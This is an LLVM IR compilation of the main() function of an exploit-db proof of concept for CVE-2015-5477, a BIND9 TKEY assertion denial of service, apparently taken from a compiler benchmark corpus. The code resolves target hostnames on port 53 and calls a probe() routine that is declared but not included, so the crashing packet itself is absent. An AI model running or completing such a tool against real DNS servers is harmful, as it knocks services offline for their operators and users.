; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_37721.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_37721.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.addrinfo = type { i32, i32, %struct.addrinfo* }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [53 x i8] c"--- PoC for CVE-2015-5477 BIND9 TKEY assert DoS ---\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"[-] no host specified\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"usage:\0A tkill <hostname>\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[+] %s: Resolving to IP address\0A\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"53\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"[-] %s: failed: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"[+] %s: Resolved to multiple IPs (NOTE)\0A\00", align 1
@NI_NUMERICHOST = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.addrinfo*, align 8
  %9 = alloca %struct.addrinfo*, align 8
  %10 = alloca [256 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca [256 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @stderr, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp sle i32 %15, 1
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %20 = load i32, i32* @stderr, align 4
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %20, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %94

22:                                               ; preds = %2
  store i32 1, i32* %6, align 4
  br label %23

23:                                               ; preds = %90, %22
  %24 = load i32, i32* %6, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %24, %25
  br i1 %26, label %27, label %93

27:                                               ; preds = %23
  %28 = load i8**, i8*** %5, align 8
  %29 = load i32, i32* %6, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8*, i8** %28, i64 %30
  %32 = load i8*, i8** %31, align 8
  store i8* %32, i8** %7, align 8
  %33 = bitcast [256 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %33, i8 0, i64 256, i1 false)
  %34 = load i32, i32* @stderr, align 4
  %35 = load i8*, i8** %7, align 8
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i8* %35)
  %37 = load i8*, i8** %7, align 8
  %38 = call i32 @getaddrinfo(i8* %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 0, %struct.addrinfo** %8)
  store i32 %38, i32* %11, align 4
  %39 = load i32, i32* %11, align 4
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %47

41:                                               ; preds = %27
  %42 = load i32, i32* @stderr, align 4
  %43 = load i8*, i8** %7, align 8
  %44 = load i32, i32* %11, align 4
  %45 = call i8* @gai_strerror(i32 %44)
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %43, i8* %45)
  br label %90

47:                                               ; preds = %27
  %48 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %49 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %48, i32 0, i32 2
  %50 = load %struct.addrinfo*, %struct.addrinfo** %49, align 8
  %51 = icmp ne %struct.addrinfo* %50, null
  br i1 %51, label %52, label %56

52:                                               ; preds = %47
  %53 = load i32, i32* @stderr, align 4
  %54 = load i8*, i8** %7, align 8
  %55 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0), i8* %54)
  br label %56

56:                                               ; preds = %52, %47
  %57 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  store %struct.addrinfo* %57, %struct.addrinfo** %9, align 8
  br label %58

58:                                               ; preds = %83, %56
  %59 = load %struct.addrinfo*, %struct.addrinfo** %9, align 8
  %60 = icmp ne %struct.addrinfo* %59, null
  br i1 %60, label %61, label %87

61:                                               ; preds = %58
  %62 = load %struct.addrinfo*, %struct.addrinfo** %9, align 8
  %63 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %62, i32 0, i32 1
  %64 = load i32, i32* %63, align 4
  %65 = load %struct.addrinfo*, %struct.addrinfo** %9, align 8
  %66 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 8
  %68 = getelementptr inbounds [256 x i8], [256 x i8]* %12, i64 0, i64 0
  %69 = load i32, i32* @NI_NUMERICHOST, align 4
  %70 = call i32 @getnameinfo(i32 %64, i32 %67, i8* %68, i32 256, i32* null, i32 0, i32 %69)
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %12, i64 0, i64 0
  %72 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %73 = call i64 @strcmp(i8* %71, i8* %72)
  %74 = icmp eq i64 %73, 0
  br i1 %74, label %75, label %76

75:                                               ; preds = %61
  br label %83

76:                                               ; preds = %61
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %12, i64 0, i64 0
  %79 = call i32 @memcpy(i8* %77, i8* %78, i32 256)
  %80 = load %struct.addrinfo*, %struct.addrinfo** %9, align 8
  %81 = call i32 @probe(%struct.addrinfo* %80)
  %82 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  br label %83

83:                                               ; preds = %76, %75
  %84 = load %struct.addrinfo*, %struct.addrinfo** %9, align 8
  %85 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %84, i32 0, i32 2
  %86 = load %struct.addrinfo*, %struct.addrinfo** %85, align 8
  store %struct.addrinfo* %86, %struct.addrinfo** %9, align 8
  br label %58

87:                                               ; preds = %58
  %88 = load %struct.addrinfo*, %struct.addrinfo** %8, align 8
  %89 = call i32 @freeaddrinfo(%struct.addrinfo* %88)
  br label %90

90:                                               ; preds = %87, %41
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %6, align 4
  br label %23

93:                                               ; preds = %23
  store i32 0, i32* %3, align 4
  br label %94

94:                                               ; preds = %93, %17
  %95 = load i32, i32* %3, align 4
  ret i32 %95
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @getaddrinfo(i8*, i8*, i32, %struct.addrinfo**) #1

declare dso_local i8* @gai_strerror(i32) #1

declare dso_local i32 @getnameinfo(i32, i32, i8*, i32, i32*, i32, i32) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @probe(%struct.addrinfo*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @freeaddrinfo(%struct.addrinfo*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
